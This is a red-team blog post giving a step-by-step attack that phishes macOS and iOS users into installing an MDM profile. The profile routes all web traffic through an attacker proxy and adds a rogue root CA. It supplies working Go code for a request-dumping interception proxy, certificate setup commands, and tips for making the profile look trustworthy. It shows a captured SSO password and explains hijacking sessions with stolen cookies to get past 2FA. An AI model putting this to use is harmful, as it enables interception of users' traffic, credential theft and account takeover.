---
author: actae0n 
layout: post
title: Hijacking Web Traffic On MacOS and iOS With MDM Profiles
tags: [MacOS]
---
## What Are MDM Profiles?
MDM profiles allow organizations to deploy common device configurations across MacOS and iOS devices. They can be deployed by hand, or via 3rd party MDM solutions such as [Jamf](https://www.jamf.com/) or [Munki](https://github.com/munki/munki/wiki/Managing-Configuration-Profiles). They're deployed as `.mobileconfig` files, which are just XML under the hood. Here's an example config that enforces a wallpaper setting:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>HasRemovalPasscode</key>
	    <false/>
	<key>PayloadContent</key>
	<array>
		<dict>
			<key>PayloadDisplayName</key>
			<string>Desktop Picture</string>
			<key>PayloadIdentifier</key>
			<string>com.apple.desktop</string>
			<key>PayloadType</key>
			<string>com.apple.desktop</string>
			<key>PayloadUUID</key>
			<string>C68C5CBC-A9AD-44F5-8C49-22E78A5D5370</string>
			<key>PayloadVersion</key>
			<integer>1</integer>
			<key>locked</key>
			<true/>
			<key>override-picture-path</key>
			<string>/usr/local/wallpaper_hax.png</string>
		</dict>
	</array>
	<key>PayloadIdentifier</key>
	    <string>test.B3664B4A-54C5-4B27-B5C7-30BF3EAD1F29</string>
	<key>PayloadRemovalDisallowed</key>
	    <false/>
	<key>PayloadType</key>
	    <string>Configuration</string>
	<key>PayloadUUID</key>
	    <string>5ED6ABEF-27E5-4724-BAFB-D5C43761D446</string>
	<key>PayloadVersion</key>
	    <integer>1</integer>
</dict>
</plist>
```

## So What?
A user can click on a `.mobileconfig` file to launch an installation wizard which will apply the attacker-controlled configuration settings to their device. Interestingly, they're not currently restricted by Gatekeeper in anyway. At the time of writing, there are no signing or notarization requirements for MDM profiles (to my knowledge). However, there is an interesting UI/UX quirk that works in favor of attackers to increase the odds of a successful installation if you do choose to sign.

## What's The Plan?
Let's build an MDM profile that sets a system wide HTTP proxy so that we can read their web traffic. Additionally, let's add our own rogue CA certificate to their Keychain, which will be trusted system wide. This will allow us to intercept HTTPS traffic without their browser throwing nasty errors. Our proxy should dump their requests for inspection, so that we can loot session cookies and credentials from it.

## Constructing The Proxy Server
There's a great Go library called [goproxy](https://github.com/elazarl/goproxy) that makes it trivial to create custom proxy applications. Let's modify one of the examples to dump requests that pass through the proxy. This will let us inspect the victim's cookies and POST data (which will include credentials for login endpoints). There's a lot of capability that can be built out here to make harvesting loot easier. Write regexes for POSTs to particular domains:uri pairs to pull out passwords. Log cookies to a database and send yourself a notification when a new session is detected for a domain you're interested in, etc. But for the sake of example, let's keep it simple.

```golang
package main

import (
	"crypto/tls"
	"crypto/x509"
	"flag"
	"io/ioutil"
	"log"
	"net/http"
	"fmt"
	"github.com/elazarl/goproxy"
	"net/http/httputil"
)

func setCA(caCert, caKey []byte) error {
	goproxyCa, err := tls.X509KeyPair(caCert, caKey)
	if err != nil {
		return err
	}
	if goproxyCa.Leaf, err = x509.ParseCertificate(goproxyCa.Certificate[0]); err != nil {
		return err
	}
	goproxy.GoproxyCa = goproxyCa
	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: goproxy.TLSConfigFromCA(&goproxyCa)}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: goproxy.TLSConfigFromCA(&goproxyCa)}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: goproxy.TLSConfigFromCA(&goproxyCa)}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: goproxy.TLSConfigFromCA(&goproxyCa)}
	return nil
}

func main() {
	verbose := flag.Bool("v", false, "should every proxy request be logged to stdout")
	addr := flag.String("addr", ":443", "proxy listen address")
	certPath := flag.String("cert", "cert.crt", "Path to CA certificate")
	keyPath := flag.String("key", "key.pem", "Path to CA key")
	flag.Parse()
	certData, err := ioutil.ReadFile(*certPath)
	if err != nil {
		log.Fatalf("Couldn't read certificate: %v\n", err)
	}
	keyData, err := ioutil.ReadFile(*keyPath)
	if err != nil {
		log.Fatalf("Couldn't read key: %v\n", err)
	}
	setCA(certData, keyData)
	proxy := goproxy.NewProxyHttpServer()
	proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
	proxy.Verbose = *verbose
	proxy.OnRequest().DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
		requestData, err := httputil.DumpRequest(req, true)
		if err != nil {
			fmt.Printf("Failed to dump request: %v\n", err)
		}
		fmt.Println(string(requestData))
		return req, nil
	})
	log.Fatal(http.ListenAndServe(*addr, proxy))
}
```

## Deploying The Proxy Server
Infrastructure-wise, I'm just going to throw the proxy setup into an ec2 instance in AWS. I'll point a domain (`0day.gg`) at it, and assign a security group allowing port 443 inbound. 
Our proxy will need a CA certificate to use. Let's generate one real quick. There's a utility called [certstrap](https://github.com/square/certstrap) by Square that I like to use in place of the OpenSSL cli that simplifies the process of generating certificates, certificate signing requests, etc. 

```
ubuntu@ip-172-31-23-174:~$ go version
go version go1.13.5 linux/amd64

ubuntu@ip-172-31-23-174:~$ go install github.com/square/certstrap
go: finding github.com/square/certstrap v1.2.0
go: downloading github.com/square/certstrap v1.2.0
go: extracting github.com/square/certstrap v1.2.0
go: downloading github.com/urfave/cli v1.21.0
go: downloading github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2c
go: extracting github.com/urfave/cli v1.21.0
go: extracting github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2c
go: downloading golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85
go: extracting golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85
go: downloading golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35
go: extracting golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35
go: finding github.com/urfave/cli v1.21.0
go: finding github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2c
go: finding golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85
go: finding golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35

ubuntu@ip-172-31-23-174:~$ certstrap init --common-name "Acme Corp"
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Created out/Acme_Corp.key
Created out/Acme_Corp.crt
Created out/Acme_Corp.crl

ubuntu@ip-172-31-23-174:~$ head out/Acme_Corp.key out/Acme_Corp.crt
==> out/Acme_Corp.key <==
-----BEGIN RSA PRIVATE KEY-----
MIIJJwIBAAKCAgEAtZdDShW/w7jlYKOaVA8PWg+ax94LVq86vXQj0YIT8DvlNLwr
9V0EWhLnPVCNAOPp077t+k8zlhybOfLaT8S9byzWGN8VH3IU79J6mzonvjIIyX14
uy5dZRL488bExVokg23DREoIJfMAtsPzGgs1xyhym8qZe70YSMrSUMS5RB8oSS8e
gId5M27mhmCCaDn2KN6FJD+LjJJZL/7lsbGHWlE9+HdcRQ1L//elvROeXm5MuAOm
aFU3GWKqkGhIGD09sDmJQoUc6v2ABWSVJ6nnhSrUPlHUvmnyJeSZHVZtTA5kV7sb
eCHTgUk1tE2GgdF9yLb6ddiENAitTlE5pxC9n+LmxiPZIr1f+8dqsjc9H7dReTsV
8hNlP7jOQ6ur3Nw1q0C9ktCrEwoN75GM7O6Ve+1vJXMWeld8pkyyOeKG+NP+ULRU
uLi20QR3COZXrjYKLEQIKM7oaOBIkTVwJni4xxKZw6h8GhuGD9mltV+DPMnr/DcW
Ax5kCeAQy1ovK7qU0kbtF23bQ2LE++iQpDzKAu9TAWCaIy2ZlTxhBVgsAEQW4gto

==> out/Acme_Corp.crt <==
-----BEGIN CERTIFICATE-----
MIIE6DCCAtCgAwIBAgIBATANBgkqhkiG9w0BAQsFADAUMRIwEAYDVQQDEwlBY21l
IENvcnAwHhcNMTkxMjE5MDQzNDU2WhcNMjEwNjE5MDQzNDUyWjAUMRIwEAYDVQQD
EwlBY21lIENvcnAwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC1l0NK
Fb/DuOVgo5pUDw9aD5rH3gtWrzq9dCPRghPwO+U0vCv1XQRaEuc9UI0A4+nTvu36
TzOWHJs58tpPxL1vLNYY3xUfchTv0nqbOie+MgjJfXi7Ll1lEvjzxsTFWiSDbcNE
Sggl8wC2w/MaCzXHKHKbypl7vRhIytJQxLlEHyhJLx6Ah3kzbuaGYIJoOfYo3oUk
P4uMklkv/uWxsYdaUT34d1xFDUv/96W9E55ebky4A6ZoVTcZYqqQaEgYPT2wOYlC
hRzq/YAFZJUnqeeFKtQ+UdS+afIl5JkdVm1MDmRXuxt4IdOBSTW0TYaB0X3Itvp1
2IQ0CK1OUTmnEL2f4ubGI9kivV/7x2qyNz0ft1F5OxXyE2U/uM5Dq6vc3DWrQL2S
```

Let's kick off the proxy server so it's ready. If you're lazy and just want to clone the super basic proxy server code, it's located [here](https://github.com/xpcmdshell/procksy). I'm just going to throw this into an ec2 instance in AWS.

```
ubuntu@ip-172-31-23-174:~$ cd procksy/
ubuntu@ip-172-31-23-174:~/procksy$ ls
go.mod  go.sum  main.go
ubuntu@ip-172-31-23-174:~/procksy$ sudo ./procksy -cert ../out/Acme_Corp.crt -key ../out/Acme_Corp.key
```

Alright, now the proxy is listening and ready to capture web traffic. Let's move on to the next step, setting up our malicious profile.


## Building The Profile
For simplicity, I'm going to use [Apple's Configurator 2](https://apps.apple.com/us/app/apple-configurator-2/id1037126344) to generate the profile. An alternative is [iMazing Profile Editor](https://apps.apple.com/us/app/imazing-profile-editor/id1487860882). There's plenty of graphical profile editor utilities, which one you use is up to you.  When you open Configurator, you'll be presented a screen that looks like the following:

![Apple Configurator 2]({{site.url}}/images/mdm/configurator_open.png)

Click `File -> New Profile` and you'll come to the profile editor window. The first tab, `General`, lets us set up a name (the profile title), a unique identifier, an organizational identifier, a description to display to the user during installation. Use these fields to tailor the install experience to your phishing pretext. 

![General Profile Configuration]({{site.url}}/images/mdm/configurator_general.png)

An important feature to note on this page is the support for automatic removal. You can set the profile to expire after a specified duration, or on a specified date. When the expiry criteria is met, the profile will be automatically uninstalled, and any settings it changed will be reverted. This includes removing your installed certificate from the Keychain. 

Next, let's set up the Proxy configuration. You'll need to set the hostname and port. You can optionally configure a username and password to authenticate to the proxy with, if your setup supports it.

![Proxy Configuration]({{site.url}}/images/mdm/configurator_proxy.png)

In order to proxy HTTPS traffic without generating trust errors, we'll need their system to trust our CA. Let's add our rogue CA certificate to their Keychain. When you click `Configure`, you'll be given a file selection dialogue to choose a cert file. After you choose your CA certificate, you'll see the following image. Don't worry about the `This root certificate is not trusted` warning. It will be trusted once installed by the profile.

![Certificate Configuration]({{site.url}}/images/mdm/configurator_ca.png)

The last step is to (optionally) sign our profile. Go to `File -> Sign Profile`. A dropdown dialogue will appear listing the code signing identities stored in your Keychain. There are benefits and caveats to weigh when signing your profile. One significant benefit is that the user will see a green `Verified` indicator in the expanded installation window next to the org name, which may increase the likelihood of them installing the profile.  Note that there aren't any profile signing or notarization requirements by default, so signing is (currently) entirely optional. Gatekeeper won't try to stop you. For the sake of demonstration, I'll sign this profile with my developer certificate.  Finally, let's save the profile and get ready to send it to the victim. Go to `File -> Save` and select a storage location.

Now, let's try to install our profile to see what the installation experience is like for the victim. When I open my MDM profile, I'm presented with the first installation pane:

![First Installation Pane]({{site.url}}/images/mdm/install_1.png)

If I click the `Show Profile` button, the pane will expand to display the profile details. Note the nice looking green `Verified` indicator that ends up right next to our company name. Legitimate looking. Very soothing. Reminds me of home. The victim will likely not understand that the `Verified` indicator simply means the profile has been signed, and that it may not legitimately be from the organization that is show next to it in that dialog.

![Show Profile]({{site.url}}/images/mdm/show_profile_verified.png)

I've redacted my Developer ID and name from the dialogue, but note that those will show up if you choose to sign your profile. Below that, the user can see the configuration details. You should count on the user wanting to click `Show Profile`, so choose a domain that fits the pretext. You can imagine `0day.gg` isn't the best choice, but it works for this demo. Something like `proxy.target-org-lookalike.tld` could be a good choice.

![Show Profile - Payload Details]({{site.url}}/images/mdm/show_profile_2.png)

After clicking continue, the user will hit one last pane (with an optional expansion button):

![Final Install Pane]({{site.url}}/images/mdm/install_final.png)
![Final Install - Expand Pane]({{site.url}}/images/mdm/install_final_expand.png)

Upon clicking `Install`, the user will be asked for either their password or fingerprint, depending on if TouchID is configured or not. After supplying credentials or using the fingerprint sensor, the profile is installed. 

## Testing The Setup
Let's hit Google and see if our setup is working. There should be no certificate errors.

![Browser Test]({{site.url}}/images/mdm/browser_verified.png)

And if we pop over to our proxy, we should see the request in STDOUT:

```
ubuntu@ip-172-31-23-174:~/procksy$ sudo ./procksy -cert ../out/Acme_Corp.crt -key ../out/Acme_Corp.key

[SNIP]

GET http://www.google.com/ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0
```

Let's simulate the victim signing in to their company SSO portal. 

![SSO Login]({{site.url}}/images/mdm/okta_login.png)

And the corresponding request in the proxy log:

```
POST / HTTP/1.1
Host: [SNIP].okta.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Cookie: __cfduid=de55169fca8d355f6b947f59708f984db1576815061; _okta_attribution={\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}; _okta_session_attribut
ion={\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}; _okta_original_attribution={\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}
Origin: https://[SNIP].okta.com
Referer: https://[SNIP].okta.com/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0

username=snacksun&password=slackersclub
```

Once the user has completed their login process and hit the landing page, we will have recorded both their credentials (username:password pair) as well as cookies for their active session. Having access to the cookies can be especially useful when attacking SSO portal that are protected with 2FA, as a user:password pair won't cut it for access. By using their user:password, you also risk triggering protections that alert on logins from a new location. Import the cookies into your own browser using an extension such as [Editthiscookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg), and have fun looting with their session.

It's useful to note that our proxy settings will be inherited by apps that respect the system HTTP proxy settings. So you're not limited to capturing/manipulating only browser-generated traffic.

## Bonus Round
Our proxy controls both the request (before hitting the destination server) and the response (before being returned to the client), so we can freely manipulate traffic. Some attacks to consider might be injecting JS hooks using something like [Beef](https://beefproject.com/) for client side phishing attacks and potential internal network access via XHR, and code injection in downloaded applications and scripts. Maybe you add a line to install scripts that the user downloads, or intercept packages, add files and manipulate scripts, resign, then forward it back to the requesting client. You're the middleman.

## Does This Work For iOS Devices?
It does, with some limitations. This payload can only be installed on an iOS device that is in [supervised mode](https://support.apple.com/guide/apple-configurator-2/supervised-devices-apd9e4f64088/mac). If the organization you're targeting issues corporate phones, they're likely centrally managed somehow, so the devices will probably be in supervised mode. In that case, you can send the MDM profile to the victim and have them open it in either Safari or the Mail app, and they will be walked through similar installation steps. The major difference in installation experience is that after downloading the profile, the user will be directed to manually go to the Profiles section in the Settings app to finish the installation.

![iOS Profile Installation]({{site.url}}/images/mdm/install_ios.png)

## Wrapping Up
MDM profiles have some interesting applications for attackers. There's a lot of attack surface to be explored here yet, and Apple hasn't yet introduced signing and verification requirements for profiles. We've seen that the HTTP proxy payload is very powerful in SSO+SaaS based environments. If you liked this post, you might find [@1njection's MDM post interesting as well](https://lockboxx.blogspot.com/2019/04/macos-red-teaming-203-mdm-mobile-device.html). If you'd like to explore all of the official keys/payloads for profiles, you should check out [Apple's reference](https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf).  
